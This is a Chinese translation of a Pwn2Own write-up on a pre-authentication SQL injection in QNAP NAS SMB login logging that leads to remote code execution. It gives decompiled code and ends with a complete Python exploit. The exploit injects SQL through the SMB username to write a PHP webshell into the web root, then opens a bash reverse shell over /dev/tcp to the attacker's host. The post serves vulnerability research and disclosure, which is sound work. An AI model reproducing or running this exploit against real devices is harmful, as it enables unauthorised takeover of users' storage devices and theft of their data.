#  Pwn2Own 爱尔兰 - QNAP SQL 注入 RCE   
HT3Labs  securitainment   2025-05-31 05:37  
  
> 【翻译】QNAP RCE Pwn2Own  
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
**CVE 评分 (3.1 版): 9.8**  
 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
  
**CWE-89: SQL 注入**  
  
**漏洞概述**  
  
该漏洞存在于遗留日志系统组件 /usr/lib/libuLinux_naslog.so  
 的 naslog_conn_add2  
 函数中。攻击者通过发起 SMB 身份验证尝试，当认证失败时会触发 write_connlog_login_deny_smb1  
 函数调用。如后文所述，该过程最终会导致 SQL 注入漏洞，进而实现远程代码执行（RCE）。  
  
**技术细节分析**  
  
负责管理 SMB 身份验证的库文件为./mnt/ext/opt/samba/lib/private/libauth-samba4.so  
。该服务可通过以下两种方式被访问：  
1. 同一网络内的远程设备  
  
1. 当 SMB 服务暴露于互联网或进行端口转发时，可通过公网直接访问  
  
当通过 SMB 协议进行身份验证失败时，设备会调用 write_connlog_login_deny_smb1  
 函数，该函数进一步调用位于内存地址 sub_A720  
 处的子程序。  
```

// 注意：反编译输出已进行缩写处理
_int64 __fastcall sub_A720(unsigned int a1, _BYTE *a2, const char *a3, const char *a4, __int64 a5, const char *a6)
{
    //... 
  v8 = "/usr/local/samba/sbin/log_ratelimit.sh";
  if ( (_DWORD)a5 != 9 )
    v8 = "/sbin/conn_log_tool";
  snprintf(v10, 0x800uLL, "%s -t %d -u '%s' -p '%s' -m '%s' -i %d -n %d -a '%s' -S", v8, a1, v7, a3, v6, 1LL, a5, a6);
  smbrun((__int64)v10, 0LL, 0LL);  // [1]
   //...
```  
  
该过程通过调用点 [1]  
 处的 smbrun  
 函数实现。由于我们能够控制 -u '%s'  
 字符串格式标识符对应的缓冲区内容，这使得攻击者可以携带任意参数执行 log_ratelimit.sh  
 脚本。  
```

#!/bin/sh

#...
argv="$@"    # all arguments. #  [1]
#...
# 解析参数并获取客户端信息
POSITIONAL_ARGS=()

while [[ $# -gt 0 ]]; do
  case $1 in
#...
    -u)
      # 当用户名前缀采用 '<DOMAIN>\<USER>' 格式的域信息时，将反斜杠 (backslash) 替换为冒号 (colon)
      # 转换为 '<DOMAIN>:<USER>' 格式以确保 grep 命令有效解析
      username=`echo "$2" | sed 's/\\\\/:/g' 2>/dev/null`
      shift # past argument
      shift # past value
      ;;
#...
  esac
done

#...

# 发送至 Qulog 系统，插入日志记录以供后续查询。后台运行以防止阻塞父进程
(/sbin/conn_log_tool $argv && CMD="${keyword}" sleep "${ratelimit_sec}") &  # [2]
ret="$?"

exit "${ret}"
```  
  
通过这种方式，我们最终能够以可控参数执行 conn_log_tool  
（该文件是 log_tool  
 的符号链接 (symlink)），如调用点 callsite 所示。该工具内部会调用 QNAP 遗留 API 中的 naslog_conn_add2  
 函数，具体调用关系如下方调用点 [1] 所示。  
```

// 注意：反编译输出已进行缩写处理
_int64 __fastcall main(int argc, char **argv)
{
  //...
  qword_60B8D0 = 0LL;
  LODWORD(qword_60B8D8) = 0;
  if ( argc <= 1 )
  {
    sub_4031F0(*argv);
    return 0LL;
  }
  while ( 2 )
  {
    v2 = getopt_long(argc, argv, "b:hcrfya:Sqt:l:u:r:s:e:vp:m:o:i:n:g:A:R:", &stru_408A40, 0LL);
    switch ( v2 )
    {
      case '\0':
        qword_60B8C0 = optarg;
        //...
            if ( (_DWORD)qword_60B8A8 != 1 )
            {
              if ( dword_60B84C == 1 )
              {
                memset(v5, 0, 0x7D8uLL);
                v5[1] = (int)qword_60B860;
                if ( src )
                  strncpy((char *)&v5[16], src, 0x40uLL);
                if ( qword_60B870 )
                  strncpy((char *)&v5[32] + 1, qword_60B870, 0x40uLL);
                if ( qword_60B878 )
                  strncpy((char *)&v5[48] + 2, qword_60B878, 0x40uLL);
                if ( qword_60B8C0 )
                  strncpy((char *)&v5[389], qword_60B8C0, 0x40uLL);
                if ( qword_60B8C8 )
                  strncpy((char *)&v5[405] + 1, qword_60B8C8, 0x80uLL);
                if ( qword_60B8D0 )
                  strncpy((char *)&v5[437] + 2, qword_60B8D0, 0xFFuLL);
                strncpy((char *)&v5[64] + 3, qword_60B858, 0x400uLL);
                v5[321] = dword_60B880;
                v5[322] = dword_60B884;
                v5[388] = (int)qword_60B8B8;
                if ( qword_60B8B0 )
                  strncpy((char *)&v5[323], qword_60B8B0, 0x100uLL);
                if ( dword_60B89C )
                  puts("Appending a log to database...");
                if ( (_DWORD)qword_60B850 == 1 )
                  tbl = SendConnToLogEngineEx4(
                          (unsigned int)v5[1],
                          &v5[16],
                          &v5[323],
                          (char *)&v5[32] + 1,
                          (char *)&v5[48] + 2,
                          (unsigned int)v5[321],
                          (unsigned int)v5[322],
                          (unsigned int)v5[388],
                          &v5[389],
                          (char *)&v5[405] + 1,
                          (char *)&v5[437] + 2,
                          (char *)&v5[64] + 3);
                else
                  tbl = naslog_conn_add2(v5);  [1]
                goto LABEL_14;
```  
  
最终调用 /usr/lib/libuLinux_naslog.so  
 中的 naslog_conn_add2  
 函数，该函数存在 SQL 注入漏洞 (SQL Injection)，如下所示。  
```

// 注：反编译输出已进行缩写处理
__int64 __fastcall naslog_conn_add2(void *a1)
{
    //...

  v1 = a1 + 64;
  if ( strlen(a1 + 64) > 0x40 )
  //...
  v13 = *((unsigned int *)a1 + 388);
  v69[v9] = 0;
  v14 = sqlite3_mprintf(
          "INSERT INTO NASLOG_CONN \t( conn_type, conn_user, conn_ip, conn_comp, conn_res, conn_serv, conn_action, conn_a"
          "pp, conn_action_result, conn_client_id, conn_client_app, conn_client_agent ) \tVALUES \t( %d, '%s', '%s', '%s'"
          ", '%s', %d, %d, '%s', %d, %Q, %Q, %Q);",
          *((unsigned int *)a1 + 1),
          v1,
          a1 + 129,
          v59,
          v69,
          *((unsigned int *)a1 + 321),
          *((unsigned int *)a1 + 322),
          v61,
          v13,
          v63,
          v60,
          v60,
          v62);
```  
  
这使我们可以向数据库注入 PHP webshell。  
## 漏洞利用 (EXPLOITATION)  
  
通过访问该 webshell 来触发其执行  
```

from smb.SMBConnection import SMBConnection
import requests, os, uuid, threading, time

shell_name = f"shell_{str(uuid.uuid4())}.php"

def run_sql(ip,sql):
    sql = sql.replace(" ","/**/")
    conn = SMBConnection(f"""x' -u xx -A "haha','1','2','3','4');{sql};--" -a abc -- x -- '""", 'blah', "g", 'g', use_ntlm_v2 = True)
    conn.connect(ip, 139)

def shell():
    os.system("ncat -lvp 1337")
    r = requests.get(f"http://{target_ip}:8080/nc/{shell_name}",params={"0":f"rm -f /mnt/ext/opt/NotificationCenter/opt/www/{shell_name}"})

if __name__ == "__main__":
    if len(os.sys.argv) != 3:
        print("<exp> {target_ip} {host_ip}")
        exit(0)
    target_ip = os.sys.argv[1]
    host_ip = os.sys.argv[2]

    try:
        print("Running SQLI to File Write")
        run_sql(target_ip,f"ATTACH DATABASE '/mnt/ext/opt/NotificationCenter/opt/www/{shell_name}' AS q;CREATE TABLE q.x (x text);INSERT INTO q.x (x) VALUES('<?=system($_GET[0]);?>')")
    except:
        print("SMB Connection didn't work :(")

    requests.get(f"http://{target_ip}:8080/nc/{shell_name}?cache_bust")
    print("Spawning Rev Shell")
    t = threading.Thread(target=shell)
    t.start()

    rev = f"bash -i >& /dev/tcp/{host_ip}/1337 0>&1"
    time.sleep(1)
    r = requests.get(f"http://{target_ip}:8080/nc/{shell_name}",params={"0":rev})
```  
  
  
